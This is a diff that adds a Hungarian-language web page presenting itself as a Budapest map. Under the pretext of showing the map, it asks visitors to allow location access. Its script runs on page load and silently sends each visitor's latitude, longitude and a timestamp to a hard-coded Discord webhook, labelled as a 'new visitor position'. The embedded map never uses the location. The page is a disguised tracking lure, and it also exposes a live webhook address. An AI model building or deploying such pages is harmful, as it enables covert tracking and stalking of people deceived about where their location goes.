@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="hu">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Térkép</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f1f1f1;
+      margin: 0;
+      padding: 0;
+      text-align: center;
+    }
+    .map-container {
+      margin-top: 30px;
+    }
+    iframe {
+      width: 95%;
+      height: 500px;
+      border: none;
+      box-shadow: 0 0 10px rgba(0,0,0,0.2);
+    }
+    #permission-message {
+      font-size: 18px;
+      color: #444;
+      margin: 20px auto 10px;
+      max-width: 600px;
+      width: 90%;
+    }
+    #retry-button {
+      display: none;
+      margin-top: 10px;
+      padding: 10px 20px;
+      font-size: 16px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    #retry-button:hover {
+      background-color: #0056b3;
+    }
+  </style>
+</head>
+<body>
+
+  <div id="permission-message">
+    Kérlek, engedélyezd a helyadatok használatát a térkép megjelenítéséhez.
+  </div>
+
+  <button id="retry-button">Próbáld újra</button>
+
+  <div class="map-container">
+    <iframe
+      src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d10729.739801180346!2d19.04!3d47.5!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x4741dc17ea2bfa81%3A0xd1b86b7b86cdfe94!2sBudapest!5e0!3m2!1shu!2shu!4v1717324200000"
+      allowfullscreen=""
+      loading="lazy">
+    </iframe>
+  </div>
+
+  <script>
+    const webhookURL = "https://discord.com/api/webhooks/1379147961950408856/VIKI2aYjwxfgLEDMGZ7sFdOuHdHJDGMNMG3HPN8qBbKK9m2-kR0J5yIo-ToWWhFEI27a";
+    const permissionMessage = document.getElementById('permission-message');
+    const retryButton = document.getElementById('retry-button');
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(siker, hiba, {
+          timeout: 10000
+        });
+      } else {
+        hiba();
+      }
+    }
+
+    function siker(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+      const time = new Date().toLocaleString();
+
+      permissionMessage.textContent = "Helyadat engedélyezve. Útvonal betöltése...";
+      retryButton.style.display = "none";
+
+      fetch(webhookURL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          content: `📍 Új látogató pozíció:\nSzélesség: ${lat}\nHosszúság: ${lon}\nIdőpont: ${time}`
+        })
+      });
+    }
+
+    function hiba() {
+      permissionMessage.textContent = "Hiba az útvonal betöltésében, kérlek engedélyezd a helyadatokat.";
+      retryButton.style.display = "inline-block";
+    }
+
+    retryButton.addEventListener('click', getLocation);
+
+    // Első próbálkozás automatikusan
+    getLocation();
+  </script>
+
+</body>
+</html>
